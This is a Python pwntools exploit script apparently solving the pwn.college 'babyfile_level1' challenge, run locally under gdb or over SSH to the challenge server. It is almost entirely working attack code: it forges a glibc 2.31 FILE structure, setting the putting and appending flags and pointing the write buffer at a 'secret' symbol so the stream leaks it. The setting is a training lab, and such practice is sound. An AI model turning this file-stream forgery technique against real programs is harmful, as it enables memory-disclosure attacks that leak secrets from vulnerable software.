from pwn import *
from time import sleep
context.binary=e=ELF("./babyfile_level1")
libc=e.libc
gs="""
set listsize 100
set $glibc_src_dir="../../glibc-2.31/"
source ~/add_src.py
b *challenge+185
b *_IO_new_file_xsputn if ($rdi != stdout) 
b *__GI__IO_file_overflow if ($rdi != stdout)
b __GI__IO_file_overflow:775
"""
_IO_CURRENTLY_PUTTING=0x0800
_IO_IS_APPENDING=0x1000
if args.LOCAL:
    p=e.process()
    if args.GDB:
        gdb.attach(p,gdbscript=gs)
        pause()
elif args.REMOTE:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key",ignore_config=True)
    p=s.process("/challenge/babyfile_level1")
sleep(1)
p.sendafter(b"Now reading from stdin directly to the FILE struct.",
                #__GI__IO_file_overflow:740 if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
                #__GI__IO_file_overflow:776         return _IO_do_write (f, f->_IO_write_base,
                #__GI__IO_file_overflow:777                              f->_IO_write_ptr - f->_IO_write_base);
                #new_do_write:434       if (fp->_flags & _IO_IS_APPENDING)
                p64(_IO_CURRENTLY_PUTTING | _IO_IS_APPENDING)+ #flag
                p64(0)+p64(0)+p64(0)+
                p64(e.sym.secret)+p64(e.sym.secret+64) # _IO_write_base , _IO_write_ptr
                +p64(0)+p64(0)+p64(0)+b"\0"*(112-8*9)+p32(1))
p.interactive()